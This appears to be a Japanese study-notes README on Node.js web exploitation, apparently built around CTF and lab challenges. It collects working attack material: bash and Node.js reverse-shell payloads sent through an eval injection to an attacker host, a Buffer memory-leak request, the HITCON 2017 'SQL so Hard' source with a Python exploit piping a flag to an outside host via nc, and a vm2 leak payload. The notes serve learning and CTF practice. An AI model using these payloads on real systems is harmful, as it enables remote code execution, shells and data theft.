<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [node.js](#nodejs)
  - [reverse shell](#reverse-shell)
- [脆弱なアプリ](#%E8%84%86%E5%BC%B1%E3%81%AA%E3%82%A2%E3%83%97%E3%83%AA)
  - [Buffer](#buffer)
  - [dustjs-helper](#dustjs-helper)
  - [node-serialize (Celestial)](#node-serialize-celestial)
  - [node-serialize (temple of doom)](#node-serialize-temple-of-doom)
  - [MySQL "max_allowed_packet"/ PostgreSQL RCE "pg\@2.x ~ pg\@7.1.0" / (hitcon2017 SQL so Hard)](#mysql-max_allowed_packet-postgresql-rce-pg%5C2x--pg%5C710--hitcon2017-sql-so-hard)
  - [Buffer(100) / vm.run() (hitcon2016 leakage)](#buffer100--vmrun-hitcon2016-leakage)
  - [](#)
  - [](#-1)
  - [](#-2)
- [サンプルアプリ](#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%82%A2%E3%83%97%E3%83%AA)
  - [progate](#progate)
- [フォルダ構成](#%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E6%A7%8B%E6%88%90)
- [メモ](#%E3%83%A1%E3%83%A2)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->
# node.js
## reverse shell
https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/  
`eval(req.query.q)`みたいになっている場合、以下でRever shellできる！  
```txt
require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.56.2/80 0>%261"')
```
また、以下のようなNode.jsを使ったRever shellもあり。  
```js
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(80, "attacker-ip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```
```txt
http://host-ip:8080/?q=var+net+=+require("net"),+sh+=+require("child_process").exec("/bin/bash");var+client+=+new+net.Socket();client.connect(80,+"attacker-ip",+function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
```
# 脆弱なアプリ
## Buffer
https://www.smrrd.de/nodejs-hacking-challenge-writeup.html   
の脆弱なアプリ。   
`./routes/index.js`の以下の部分が脆弱。`new Buffer("admin password")`の部分に`new Buffer(100)`となるようにJSONリクエストの内容を変更すれば、メモリが100バイト分返ってくる。   
以下は正常な場合の文字列を送信した挙動。   
![image](https://user-images.githubusercontent.com/56021519/101337517-1bb9c300-38bf-11eb-82ac-88e99a69edca.png)   
以下は文字列ではなく数値を送信した挙動。   
![image](https://user-images.githubusercontent.com/56021519/101337601-37bd6480-38bf-11eb-93f4-58d5fdcd7b23.png)   
curlでこれを何回か繰り返せばsessionの署名に使う暗号化キーが得られるらしいが、自分でやったときは何回やっても得られなかった…NodeJSのバージョンを落とさないとダメなのか？？   
```txt
root@kali:~/Documents/AWAE/nodejs# curl http://localhost:3000/login -X POST -H "Content-Type: application/json" --data "{\"password\": 100}" | hexdump -C
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   662  100   645  100    17   125k   3400 --:--:-- --:--:-- --:--:--  129k
00000000  7b 22 73 74 61 74 75 73  22 3a 22 65 72 72 6f 72  |{"status":"error|
00000010  22 2c 22 65 72 72 6f 72  22 3a 22 70 61 73 73 77  |","error":"passw|
00000020  6f 72 64 20 77 72 6f 6e  67 3a 20 5c 75 30 30 30  |ord wrong: \u000|
00000030  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000040  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000050  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000060  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000070  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000080  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000090  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000000a0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000000b0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000000c0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000000d0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000000e0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000000f0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000100  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000110  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000120  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000130  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000140  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000150  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000160  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000170  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000180  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000190  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000001a0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000001b0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000001c0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000001d0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000001e0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000001f0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000200  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000210  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000220  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000230  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000240  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000250  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000260  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000270  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000280  30 30 30 22 7d                                    |000"}|
00000285
```
## dustjs-helper
if helperのevalと不十分な入力検証でRCEできる脆弱なNode.jsモジュール。   
https://github.com/linkedin/dustjs   
https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/README.md   
よくわからんけどどうやら修正されてないっぽい。   
## node-serialize (Celestial)
HackTheBoxのCelestialでこのモジュールの逆シリアライズの脆弱性がある。   
https://github.com/takabaya-shi/CTF-writeup/blob/master/HackTheBox/celestial/README.md   
にWriteupを書いた。   
## node-serialize (temple of doom)
Vulnhubのtemple of doomでCelestialと同じの逆シリアライズの脆弱性がある。   
https://github.com/takabaya-shi/CTF-writeup/tree/master/Vulnhub/temple%20of%20doom   

## MySQL "max_allowed_packet"/ PostgreSQL RCE "pg\@2.x ~ pg\@7.1.0" / (hitcon2017 SQL so Hard)
https://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard  
https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/sql-so-hard.md  
配布されるNode.jsの`app.js`は以下の通り。  
hintとしてnode.jsのpostgresモジュールのRCEの脆弱性が与えられる。  
https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability  
`function waf(string) {`で禁止文字列を定義されてる。  
`app.all("/*",`で入力したQueryとBodyをIPとともにMySQLのデータベースにブラックリストに登録。    
つまり、このMySQLが実行されないようにしないといけない？  
`app.post("/reg",`でPostgeSQLのデータベースに入力をサニタイジングなしにSQL構文を作成しているのでここでRCEできる！  
```js
#!/usr/bin/node

/**
 *  @HITCON CTF 2017
 *  @Author Orange Tsai
 */

const qs = require("qs");
const fs = require("fs");
const pg = require("pg");
const mysql = require("mysql");
const crypto = require("crypto");
const express = require("express");

const pool = mysql.createPool({
    connectionLimit: 100, 
    host: "localhost",
    user: "ban",
    password: "ban",
    database: "bandb",
});

const client = new pg.Client({
    host: "localhost",
    user: "userdb",
    password: "userdb",
    database: "userdb",
});
client.connect();

const KEYWORDS = [
    "select", 
    "union", 
    "and", 
    "or", 
    "\\", 
    "/", 
    "*", 
    " " 
]

function waf(string) {
    for (var i in KEYWORDS) {
        var key = KEYWORDS[i];
        if (string.toLowerCase().indexOf(key) !== -1) {
            return true;
        }
    }
    return false;
}

const app = express();
app.use((req, res, next) => { // ミドルウェア関数を定義。はじめに呼ばれる
   var data = "";
   req.on("data", (chunk) => { data += chunk})
   req.on("end", () =>{
       req.body = qs.parse(data);  // 受信したデータ(QueryとBody)を解析して配列で保持
       next();  // 次のミドルウェア関数を実行
   })
})


app.all("/*", (req, res, next) => {  // 多分app.useのあとに実行される。/*のルーティングで実行
    if ("show_source" in req.query) {
        return res.end(fs.readFileSync(__filename));
    }
    if (req.path == "/") {
        return next();
    }

    var ip = req.connection.remoteAddress;
    var payload = "";
    for (var k in req.query) {
        if (waf(req.query[k])) {
            payload = req.query[k];
            break;
        }
    }
    for (var k in req.body) {
        if (waf(req.body[k])) {
            payload = req.body[k];
            break;
        }
    }

    if (payload.length > 0) {  // MySQLでブラックリストに登録
        var sql = `INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`;
    } else {
        var sql = `SELECT ?,?,?`;
    }
    
    return pool.query(sql, [ip, payload, payload], (err, rows) => {
        var sql = `SELECT * FROM blacklists WHERE ip=?`;
        return pool.query(sql, [ip], (err,rows) => {
            if ( rows.length == 0) {
                return next();
            } else {
                return res.end("Shame on you"); // ブラックリストに登録されていれば終了
            }
            
        });
    });

});


app.get("/", (req, res) => {
    var sql = `SELECT * FROM blacklists GROUP BY ip`;
    return pool.query(sql, [], (err,rows) => {
        res.header("Content-Type", "text/html");
        var html = "<pre>Here is the <a href=/?show_source=1>source</a>, thanks to Orange\n\n<h3>Hall of Shame</h3>(delete every 60s)\n";
        for(var r in rows) {
            html += `${parseInt(r)+1}. ${rows[r].ip}\n`;

        }
        return res.end(html);
    });

});

app.post("/reg", (req, res) => {
    var username = req.body.username;
    var password = req.body.password;
    if (!username || !password || username.length < 4 || password.length < 4) {
        return res.end("Bye");
    } 

    password = crypto.createHash("md5").update(password).digest("hex");
    var sql = `INSERT INTO users(username, password) VALUES('${username}', '${password}') ON CONFLICT (username) DO NOTHING`; // Postgresを実行
    return client.query(sql.split(";")[0], (err, rows) => {
        if (rows && rows.rowCount == 1) {
            return res.end("Reg OK");
        } else {
            return res.end("User taken");
        }
    });
});

app.listen(31337, () => {
    console.log("Listen OK");
});
```
MySQLの`max_allowed_packet `では入力が大きすぎるとドロップして実行しないらしい。  
WAFのバイパスはイマイチよくわかってない……  
以下がExploitらしい。  
```python
from random import randint
import requests

# payload = "union"
payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/readflag|nc orange.tw 12345`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)


username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))
data = {
            'username': username+payload, 
                'password': 'AAAAAA'
                }
print 'ok'
r = requests.post('http://13.113.21.59:31337/reg', data=data);
print r.content
```
## Buffer(100) / vm.run() (hitcon2016 leakage)
https://lorexxar.cn/2016/10/10/hitcon2016/  
https://github.com/orangetw/My-CTF-Web-Challenges#leaking  
以下のソースがある。  
` eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")`でFlagを定義してるけど変数名がランダムになっていてわからん。  
`res.send("eval ->" + vm.run(req.query.data));`でユーザーからのコードを実行できる。  
```js
"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {VM} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function (req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function () {
    console.log("listening on port 3000!");
```
https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md  
`Buffer(100)`でメモリの中身をリークすればよい。  
- **payload**  
```txt
http://52.198.115.130:3000/?data[]=for (var step = 0; step < 100000; step++) {var buf = (new Buffer(100)).toString('ascii');if (buf.indexOf("hitcon{") !== -1) {break;}}buf;
flag: hitcon{4nother h34rtbleed in n0dejs? or do u solved by other way?}
```
## 
- **payload**  
## 
- **payload**  
## 
- **payload**  

# サンプルアプリ
## progate
プロゲートの無料のアプリ。  
## node-express-realworld-example-app
https://github.com/gothinkster/node-express-realworld-example-app  
### routes
```txt
.
├── app.js				// expressサーバーの設定
├── package.json
├── public				// 静的ファイル置き場
│   ├── .keep
├── routes				// サーバー側のコントローラ
│   ├── index.js
│   └── auth.js
|   └──api
|       ├── articles.js
|       ├── index.js
|       ├── profiles.js
|       ├── tags.js
|       └── users.js            
└── config					// 
    ├── index.js
    └── passport.js
```
# フォルダ構成
```txt
.
├── app.js				// expressサーバーの設定
├── bin
│   └── www				// サーバーの起動
├── package.json
├── public				// 静的ファイル置き場
│   ├── images
│   ├── javascripts
│   └── stylesheets
│       └── style.css
├── routes				// サーバー側のコントローラ
│   ├── index.js
│   └── users.js
└── views					// サーバー側で画面を作成する際のテンプレート
    ├── error.jade
    ├── index.jade
    └── layout.jade
```



# メモ
https://www.smrrd.de/nodejs-hacking-challenge.html   
にNodeJSのハッキングチャレンジ記事がある   
https://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501   
https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/   
NodeJSのSSRFのWriteup？的なものがある   
https://medium.com/egghunter/node-1-vulnhub-walkthrough-5635aa56cc74   
NodeJSのapp.jsはデータベースのデータをコマンドとして実行しようとするので、データベースに任意のコマンドを書き込む。シェルをゲット後の話。   
https://mars-cheng.github.io/blog/2018/Vulnhub-Temple-of-Doom-1-Write-up/   
node-serialize remote code execution(CVE-2017-5941)らしい。よさそう。   
https://www.hackingarticles.in/moonraker1-vulnhub-walkthrough/   
Node.js deserialization exploit for RCE   
https://cybervaultsec.com/ceh/hackthebox-celestial/   
HackTheBoxのCelestical.NodeJSのデシリアライズっぽい。   
https://www.doyler.net/security-not-included/nodejs-code-injection   
NodeJSのコマンドインジェクションのWriteup   
   
https://gist.github.com/mitsuruog/fc48397a8e80f051a145   
Nodejsの基本   
https://developer.mozilla.org/ja/docs/Learn/Server-side/Express_Nodejs/Introduction   
Node.jsの基本   
https://qiita.com/ganariya/items/85e51e718e56e7d128b8  
Node.jsの基本。わかりやすい。ミドルウェアとかのわかりやすい解説。  
